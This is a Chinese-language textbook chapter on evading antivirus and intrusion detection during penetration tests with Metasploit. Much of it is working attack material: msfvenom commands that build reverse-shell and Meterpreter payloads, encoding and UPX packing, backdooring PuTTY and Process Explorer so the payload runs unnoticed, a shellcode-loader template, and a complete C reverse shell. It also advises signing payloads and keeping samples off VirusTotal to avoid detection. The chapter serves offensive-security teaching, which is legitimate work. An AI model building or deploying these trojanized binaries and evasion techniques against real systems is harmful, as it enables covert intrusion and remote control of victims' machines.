# 7 规避检测

当你执行隐蔽渗透测试时，没有什么比被杀毒软件发现更尴尬的了。这个细节很容易被忽略，但如果你不制定规避检测的计划，目标很快就会注意到有可疑情况发生。本章将介绍规避杀毒软件和入侵检测系统的方法。

大多数杀毒软件使用称为签名（signatures）的数据位和规则来识别样本中恶意代码的特征。这些签名被加载到杀毒引擎中，引擎扫描磁盘存储和正在运行的进程以查找匹配项。当发现匹配时，大多数杀毒软件会隔离二进制文件或终止正在运行的进程。

签名必须足够精确以识别恶意程序，同时又要足够灵活以忽略合法软件。这种模型相对容易实现，但在实践中效果有限。尽管如此，杀毒软件出版商赚了很多钱，并且这个行业中有很多聪明且才华横溢的人在工作。如果你打算使用非自定义构建的载荷，可以预期杀毒软件会检测到它。

为了规避基于特征匹配的杀毒软件，我们可以创建独特的 payload，使其不匹配杀毒软件保护系统上的任何现有特征。此外，当我们将 Metasploit payload 作为漏洞利用的一部分发送时，该 payload 将在内存中运行，且不会向硬盘写入任何数据——这也是 Metasploit 框架试图避免检测的另一种方式。

本章我们不会聚焦于具体命令，而是关注底层概念。思考哪些类型的特征可能触发杀毒软件，然后尝试使用本文介绍的技术修改代码片段，使其不再匹配这些特征。在自己的实验环境中，不要害怕尝试创建新的 payload。请记住，正是 payload 的独特性才能帮助你规避检测。

规避是一个不断演进的领域，防御者可能会开发出工具来瓦解我们在本章讨论的许多规避技术。请将这些技术视为一个案例研究，它将为你提供基础知识和背景，以便在未来出现新的规避技术时能够理解它们。规避是一个需要你不断跟进最新动态的领域。

## 使用 MSFvenom 创建独特二进制文件

为了试验检测规避技术，让我们使用 MSFvenom 创建一个 Metasploit 反向 shell。该反向 shell 会连接到攻击者，并在目标上产生一个命令 shell。运行 MSFvenom，并使用 `exe` 作为输出格式。这将生成一个 Windows 可执行文件（PE 文件）。当目标点击或运行该可执行文件时，它将启动 payload：

```sh
kali@kali :~ $ sudo msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.101
LPORT=31337 -f exe > /tmp/payload1.exe
kali@kali :~ $ file /tmp/payload1.exe
var/www/payload1.exe: MS-DOS executable PE for MS Windows (GUI) Intel 80386 32-bit
```

现在我们有了一个可执行文件，可以使用 MSFconsole 中的 `multi/handler` 模块启动一个监听器。该模块允许 Metasploit 监听反向连接：

```sh
msf > use exploit/multi/handler
msf exploit(handler) > show options
Payload options (windows/meterpreter/reverse_tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
LHOST 192.168.1.101 yes The local address
LPORT 4444 yes The local port
msf exploit(handler) > set PAYLOAD windows/shell_reverse_tcp
PAYLOAD => windows/shell_reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.101
LHOST => 192.168.1.101
msf exploit(handler) > set LPORT 31337
LPORT => 31337
msf exploit(handler) > exploit
```

我们首先显示 `multi/handler` 模块的选项。然后，将 payload 设置为 Windows 反向 shell，以匹配我们之前创建的可执行文件的行为。指定要监听的 IP 地址和端口，然后运行该模块。

我们刚刚用 MSFvenom 创建的可执行文件没有使用任何规避策略，因此许多杀毒系统都会检测到它。我们可以使用 VirusTotal 来查看哪些杀毒系统可能检测到我们的 payload。在图 7-1 中，你可以看到在测试的 66 个杀毒系统中，有 51 个检测到了它。

## 使用 MSFvenom 编码

规避杀毒软件检测的一种方法是确保载荷的签名是唯一的。我们可以通过使用 MSFvenom 对载荷进行编码来创建唯一签名。这将更改可执行文件中的代码，使其看起来与杀毒软件预期的不同，但运行方式相同。

在 MSFvenom 的选项中，编码器格式是最重要的之一。要列出编码器格式，我们使用 `msfvenom --list encoders`，如下所示。请注意，不同的编码器用于不同的平台。例如，PowerPC（PPC）编码器无法在 x86 平台上正常运行，因为两种架构存在差异：

```bash
kali@kali:~$ sudo msfvenom --list encoders
```

不幸的是，VirusTotal 再次检测到了编码后的载荷，如图 7-2 所示。这一次，甚至被更多的杀毒系统检测到。

我们使用的 `shikata_ga_nai` 编码器是多态的，意味着每次运行脚本时载荷都会发生变化。因此，当你使用它生成载荷时，杀毒程序可能一次标记它，另一次则漏过。因此，你应该在渗透测试中使用载荷之前，使用杀毒产品的评估版本来测试你的脚本，看是否能绕过该软件。只需记住禁用示例上传，以防止杀毒系统将你的新载荷分享到其远程数据库。

这里规避失败的部分原因也是 MSFvenom 用于生成可执行文件的模板。本章后面，我们将讨论如何使用自定义可执行模板来解决这个问题。

游戏仍在继续：随着新的规避技术被发现，新的检测方法也被实现。在我们讨论自定义模板之前，让我们看看另一种曾经非常有效但现在已不太有用的方法，称为“打包”。它应作为一个有启发性的案例研究。

## 打包可执行文件

打包器（Packers）是压缩可执行文件并将其与解压代码合并的工具。当这个新的可执行文件运行时，解压代码会在执行前从压缩代码中重新创建原始可执行文件。这通常是透明发生的，因此压缩后的可执行文件可以像原始文件一样使用。打包过程会产生一个更小的可执行文件，同时保留原始文件的所有功能。

与 MSFvenom 一样，打包器会改变可执行文件的结构。然而，与通常增加可执行文件大小的 MSFvenom 编码过程不同，精心选择的打包器将使用各种算法来压缩和加密可执行文件。让我们尝试使用 Kali Linux 中流行的 UPX 打包器来压缩和编码我们的 `payload2.exe` 文件，以尝试规避杀毒检测：

```bash
kali@kali:~$ sudo apt-get install upx

kali@kali:~$ upx --help
Usage: upx [-123456789dlthVL] [-qvfk] [-o file] file...
--snip--

kali@kali:~$ upx -5 payload2.exe
                       File size         Ratio      Format     Name
                    --------------------   ------    -----------   -----------
     73802 ->       48128   65.21%    win32/pe     payload2.exe
Packed 1 file.
```

我们安装 UPX，然后运行 `--help` 查看其命令行选项。压缩级别介于 1 和 9 之间。这里我们使用压缩级别 `-5` 来压缩和打包可执行文件。可以看到 UPX 将我们的载荷压缩了 65.21%。在我们的测试中，只有 69 个杀毒厂商中的 50 个检测到了 UPX 打包的二进制文件（图 7-3）。这比我们之前的尝试少了 6 个，但 69 个测试系统中仍有 50 个检测到，这并不理想。

<center>图 7-3：在 VirusTotal 上测试打包二进制文件的结果</center>

PolyPack 项目展示了使用各种打包器打包已知恶意二进制文件的结果，以及打包前后杀毒检测的有效性。你可以在 Jon Oberheide、Michael Bailey 和 Farnam Jahanian 的论文《PolyPack: An Automated Online Packing Service for Optimal Antivirus Evasion》（https://faculty.cc.gatech.edu/~mbailey/publications/woot09_final.pdf）中阅读相关内容。

## 自定义可执行模板

当我们不修改静态二进制文件本身而进行杀毒规避时，我们总是陷入猫鼠游戏，因为杀毒签名会频繁更新以检测新的和变化的载荷。

通常，当运行 MSFvenom 时，载荷被嵌入到位于 `/usr/share/metasploit-framework/data/templates/template.exe` 的默认 MSFvenom 可执行模板中。尽管此模板偶尔会更改，但杀毒厂商在构建签名时仍然会查找它。然而，MSFvenom 也支持使用任何 Windows 可执行文件替换默认可执行模板，通过 `-x` 选项。在以下示例中，我们使用微软 Sysinternals 套件中的 Process Explorer 作为自定义可执行模板：

```bash
kali@kali:~$ sudo wget https://download.sysinternals.com/files/ProcessExplorer.zip
'ProcessExplorer.zip' saved [1615732/1615732]

kali@kali:~$ mkdir work/
kali@kali:~$ cd work/
kali@kali:~/work$ unzip ../ProcessExplorer.zip
Archive:  ../ProcessExplorer.zip
  inflating: procexp.chm
  inflating: procexp64.exe
  inflating: procexp64a.exe
  inflating: procexp.exe
  inflating: Eula.txt

kali@kali:~/work$ cd ..

kali@kali:~$ msfvenom -a x86 --platform windows -x work/procexp.exe -f exe -e x86/shikata_ga_nai -i 10 -b "\x00" -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=443 -o procexp.exe
Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai succeeded with size 624 (iteration=9)
x86/shikata_ga_nai chosen with final size 624
Payload size: 624 bytes
Final size of exe file: 4613120 bytes
```

如你所见，我们从微软下载了 Process Explorer 并解压。然后，使用 `-x` 标志指定下载的 Process Explorer 二进制文件作为我们的自定义模板。现在让我们在 VirusTotal 上测试我们的新二进制文件（图 7-4）。

## 隐蔽启动载荷

在大多数情况下，当目标用户启动后门可执行文件（比如我们刚刚生成的）时，似乎什么也没有发生，这可能会引起怀疑。为了提高不被目标察觉的机会，你可以在启动载荷的同时继续执行被启动应用程序的正常功能：

```bash
kali@kali:~$ sudo wget https://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
'putty.exe' saved [454656/454656]

kali@kali:~$ msfvenom -a x86 --platform windows -x putty.exe --keep -f exe -e x86/shikata_ga_nai -i 10 -b "\x00" -p windows/meterpreter/reverse_tcp LHOST=192.168.1.104 LPORT=443 -o putty_backdoor.exe
[*] x86/shikata_ga_nai succeeded with size 342 (iteration=1)
[*] x86/shikata_ga_nai succeeded with size 369 (iteration=2)
[*] x86/shikata_ga_nai succeeded with size 396 (iteration=3)
[*] x86/shikata_ga_nai succeeded with size 423 (iteration=4)
[*] x86/shikata_ga_nai succeeded with size 450 (iteration=5)
```

我们下载了 PuTTY Windows SSH 客户端，并使用 `--keep` 标志来保留 PuTTY 的原始功能。`--keep` 标志配置载荷在主可执行文件的单独线程中启动，以便应用程序在载荷执行时行为正常。当此可执行文件被处理时，它现在应该能通过检查，并且在执行时仍然为我们提供一个 shell。（此选项可能不适用于所有可执行文件，因此请务必在部署前进行测试。）

在选择将载荷嵌入可执行文件时，如果你指定了 `--keep` 标志，应考虑使用基于 GUI 的应用程序。如果你将载荷嵌入到基于控制台的应用程序中，当载荷运行时，它会显示一个控制台窗口，直到你使用完载荷才会关闭。如果你选择基于 GUI 的应用程序并指定 `--keep` 标志，目标在载荷执行时不会看到控制台窗口。对这些小细节的关注可以帮助你在渗透测试中保持隐蔽。

## 开发自定义载荷

规避检测的最佳方法之一是使用有效开发者证书签名的自定义载荷。杀毒程序通常信任由可信开发者签名的二进制文件，因此如果你是国家级攻击者，有能力窃取微软证书的私钥，你会发现这非常有价值。作为一个案例研究，让我们为 Unix 系统开发一个自定义反向 shell。首先查看这个 Windows 系统的示例模板：

```c
#include <windows.h>

int main(int argc, char **argv) {
    char shellcode[] = "\xb1\xb1\x66\x8a\x7c...";
    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof shellcode);
    ((void(*)())exec)();
}
```

我们首先将 shellcode 存储在一个数组中❶。然后，在进程中分配空间❷，将 shellcode 复制到进程中❸，并执行它❹。将 shellcode 直接嵌入载荷会增加载荷被检测到的可能性，因此更隐蔽的方法是编写一个程序，通过网络获取载荷并直接加载到内存中。你可以在 F-Secure 的博客文章《Dynamic Shellcode Execution》（https://blog.f-secure.com/dynamic-shellcode-execution/）中找到此类程序的一个示例。

接下来，我们将讨论如何使用 Metasploit 简化此过程。我们不会使用 MSFvenom 生成载荷，而是编写一个连接到 Metasploit 的反向 shell（载荷）。一旦载荷连接上，Metasploit 会将其升级为 Meterpreter 会话。这样，Meterpreter shellcode 都不会存储在载荷中。以下源代码在 C 中实现了一个反向 shell：

```c
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main () {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(443);
    const char* LHOST = "192.168.0.155";
    inet_aton(LHOST, &addr.sin_addr);

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    connect(sockfd, (struct sockaddr *) &addr, sizeof(addr));
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    execve("/bin/sh", NULL, NULL);
    return 0;
}
```

我们的反向 shell 通过套接字在互联网上接收命令，并在目标机器上运行这些命令。脚本首先设置一个包含套接字进行连接所需所有信息的结构体。这包括套接字类型 AF_INET（表示我们使用 IPv4），以及攻击者机器的端口和 IP 地址。

设置好结构体和套接字后，我们使用 `connect` 函数与攻击机上运行的处理程序进行通信。接下来，我们将标准输入、标准输出和标准错误流链接到套接字，使得套接字产生的输入、输出和错误能够被我们的程序处理。最后，我们用进程中的 Unix shell 替换当前进程。由于我们链接了套接字和调用 shell 的进程，来自套接字的信息将被传递给终端。

让我们编译反向 shell：

```bash
kali@kali:~$ sudo gcc shell.c -o test
```

## 从 Python 文件生成可执行文件

我们的自定义反向 shell 不具备 Meterpreter shell 的所有功能。例如，我们无法迁移到其他进程或使用 Metasploit 的所有后渗透模块。另一种在规避杀毒方面特别有效，同时仍然允许我们使用 Meterpreter shell 的策略是从包含 Base64 编码程序的 Python 文件生成可执行文件。运行以下命令生成 Python 载荷：

```bash
kali@kali:~$ sudo msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.101 LPORT=443 -f raw -o payload.py
```

请注意，我们选择了 `reverse_https` shell 而不是 `reverse_tcp` shell。使用 `reverse_https` shell 允许我们加密载荷与 Metasploit 框架之间的通信，因为 HTTPS 流量是加密的。加密很重要，因为即使你成功规避了杀毒系统，你还需要规避网络监控和入侵检测系统（如 Snort），这些系统会检查你的植入物产生的网络流量。加密通信有助于避免这种检测。

你的载荷还必须通过目标的防火墙。幸运的是，许多防火墙需要保持 443 和 53 端口开放，以便机器可以访问 Web 服务器和 DNS 服务器。让我们启动将管理与载荷加密连接的处理程序：

```bash
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload python/meterpreter/reverse_https
payload => python/meterpreter/reverse_https
msf exploit(multi/handler) > options

Module options (exploit/multi/handler):

Name  Current Setting  Required  Description
----  ---------------  --------  -----------

Payload options (python/meterpreter/reverse_https):

Name   Current Setting  Required  Description
----   ---------------  --------  -----------
LHOST  192.168.1.101    yes       The local listener host name
LPORT  443              yes       The local listener port
LURI                    no        The HTTP Path

Exploit target:

Id  Name
--  ----
0   Wildcard Target

msf exploit(multi/handler) > exploit

[*] Started HTTPS reverse handler on https://0.0.0.0:443
```

这些命令仅启动处理程序。要生成可执行文件，你必须在 Windows 机器上工作。你可以选择几个程序来完成此操作，例如 `py2exe` 命令行界面或 `auto-py-to-exe`（一个逐步创建可执行文件的图形用户界面）。你还可以使用 Nullsoft Scriptable Install System（NSIS）创建自定义安装向导。请记住，许多杀毒系统会标记未签名的可执行文件，因此请使用 Microsoft SignTool 对你的二进制文件进行签名。一旦你拥有了签名后的可执行文件，如果你打算在渗透测试中使用它，请不要将其上传到 VirusTotal，因为你不想让该样本被添加到其恶意样本库中。

## 总结

即使以互联网的标准来看，杀毒软件的世界也变化非常快。在撰写本文时，本章中记录的方法和过程仍然有效；然而，经验表明，即使是几个月的时间，杀毒规避的实现方式也可能发生重大变化。尽管 Metasploit 团队不断调整其载荷，试图领先检测算法一步，但当你阅读这些示例时，如果其中一些有效而另一些无效，请不要感到惊讶。当你尝试进行杀毒规避时，可以考虑使用多个打包器或编码器，或者编写自己的工具。杀毒规避，就像所有渗透测试技能一样，需要实践并需要专门的研究来帮助你在工作中取得成功。对于有兴趣了解更多高级技术以开发规避检测的载荷和植入物的读者，mr.d0x、NUL0x4C 和 5pider 在 https://maldevacademy.com 上开发了一个包含 100 多个模块的优秀资源。
